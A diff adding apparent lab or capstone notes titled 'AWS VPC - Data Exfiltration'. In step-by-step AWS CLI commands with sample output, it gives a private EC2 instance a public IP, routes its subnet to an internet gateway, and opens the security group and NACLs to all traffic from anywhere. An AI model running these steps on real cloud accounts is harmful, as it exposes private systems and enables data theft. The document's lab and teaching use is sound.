@@ -1,0 +1,164 @@
+AWS VPC - Data Exfiltration
+
+1) Alocate new public IP address to the EC2 instance
+Command CloudShell: aws ec2 allocate-address
+
+Example output:
+    "NetworkBorderGroup": "us-east-1",
+    "Domain": "vpc",
+    "PublicIp": "52.204.202.130"
+}
+
+2) Find the ENI (network interface) for the Target machine
+Command CloudShell: aws ec2 describe-instances > instances.json
+Command with grep: grep eni instances.json
+
+Example Output:
+  "AttachmentId": "eni-attach-08e1f3cc79f80f7cd",
+                            "NetworkInterfaceId": "eni-0d66c30b373c693a8",
+                                "AttachmentId": "eni-attach-069ef9c710f41df82",
+                            "NetworkInterfaceId": "eni-09ee50c8ccb53580c",
+                                "AttachmentId": "eni-attach-02f30071968e3c5e8",
+                            "NetworkInterfaceId": "eni-066e3faad2bef817e",
+
+3) Attach the public IP to the ENI of the target machine, by associating the AllocationId with the NetworkInterfaceId.
+Command: aws ec2 associate-address --network-interface-id eni-0d66c30b373c693a8 --allocation-id eipalloc-0742760cf386b1f93
+
+Example Output:
+{
+    "AssociationId": "eipassoc-0989a693494b1f706"
+}
+
+--------------------------------------------------------------------------------------------
+Change Route Table allowing a private subnet direct Internet access.
+
+4) Get the IGW ID.
+Command: aws ec2 describe-internet-gateways
+
+Example Output: 
+InternetGateways": [
+        {
+            "Attachments": [
+                {
+                    "State": "available",
+                    "VpcId": "vpc-07498a6d0c35b24b3"
+                }
+            ],
+            "InternetGatewayId": "igw-0a5083664cefa75b1",
+
+5) Now, get the Route Table ID. You want the one with the Tag Name "VPC-Capstone-PrivateRouteTable"
+Command to save RT in json: aws ec2 describe-route-tables > route-tables.json
+**View rt with 0.0.0.0/0**
+
+Command to modify RT: aws ec2 create-route --route-table-id rtb-0d02bda3e9c193301 --destination-cidr-block 0.0.0.0/0 --gateway-id igw-0a5083664cefa75b1
+
+Example Output:
+{
+    "Return": true
+}
+
+6) View actual route tables 
+Command:  aws ec2 describe-route-tables
+
+Example Output:
+      {
+                    "DestinationCidrBlock": "0.0.0.0/0",
+                    "GatewayId": "igw-0a5083664cefa75b1",
+                    "Origin": "CreateRoute",
+                    "State": "active"
+                },
+--------------------------------------------------------------------------------------------
+Modify the security group to allow access to the world.
+
+7) Find GroupID 
+Command: aws ec2 describe-security-groups > security-groups.json
+
+Example Output:
+ "GroupId": "sg-089f29bd669f7f350",
+            "IpPermissionsEgress": [
+                {
+                    "IpProtocol": "-1",
+                    "UserIdGroupPairs": [],
+                    "IpRanges": [
+                        {
+                            "CidrIp": "0.0.0.0/0"
+                        }
+                    ],
+                    "Ipv6Ranges": [],
+                    "PrefixListIds": []
+                }
+            ],
+            "Tags": [
+                {
+                    "Key": "Name",
+                    "Value": "Engineering Wiki Security Group"
+                },
+
+8) Next, create a security group rule to allow all traffic from everywhere.
+Command: aws ec2 authorize-security-group-ingress  --protocol all --port 0-65535 --cidr 0.0.0.0/0 --group-id sg-089f29bd669f7f350
+
+Example Output:
+{
+    "Return": true,
+    "SecurityGroupRules": [
+        {
+            "SecurityGroupRuleId": "sgr-0f442de381120314b",
+            "GroupId": "sg-089f29bd669f7f350",
+            "GroupOwnerId": "514015205829",
+            "IsEgress": false,
+            "IpProtocol": "-1",
+            "FromPort": -1,
+            "ToPort": -1,
+            "CidrIpv4": "0.0.0.0/0",
+            "SecurityGroupRuleArn": "arn:aws:ec2:us-east-1:514015205829:security-group-rule/sgr-0f442de381120314b"
+        }
+    ]
+}
+
+------------------------------------------------------------------------------------------
+Fix the NACLs to allow access
+
+9) Describe NACLs 
+Command: aws ec2 describe-network-acls > nacls.json
+
+10) See and add another rule in the NACL list
+The following command will create a new rule at the top of the evaluation list (--rule-number 1) to allow all traffic (--protocol -1) from anywhere(--cidr-block 0.0.0.0/0) to the Subnet.
+
+Command: aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --ingress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0461eb33fd079a9b9
+Note: the above command will not return any output.
+
+11) Create an egress rule
+Command: aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --egress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0461eb33fd079a9b9
+Note: the above command will not return any output.
+
+12) View the previous NACL 
+aws ec2 describe-network-acls --filters Name=network-acl-id,Values=acl-0461eb33fd079a9b9
+
+Example Output:
+"NetworkAcls": [
+        {
+            "Associations": [
+                {
+                    "NetworkAclAssociationId": "aclassoc-081984dbff51863a8",
+                    "NetworkAclId": "acl-0461eb33fd079a9b9",
+                    "SubnetId": "subnet-0db17ac6a93d849d3"
+                }
+            ],
+            "Entries": [
+                {
+                    "CidrBlock": "0.0.0.0/0",
+                    "Egress": true,
+                    "Protocol": "-1",
+                    "RuleAction": "allow",
+                    "RuleNumber": 1
+                },
+                {
+                    "CidrBlock": "0.0.0.0/0",
+                    "Egress": true,
+                    "Protocol": "-1",
+                    "RuleAction": "allow",
+                    "RuleNumber": 100
+                },
+
+
+
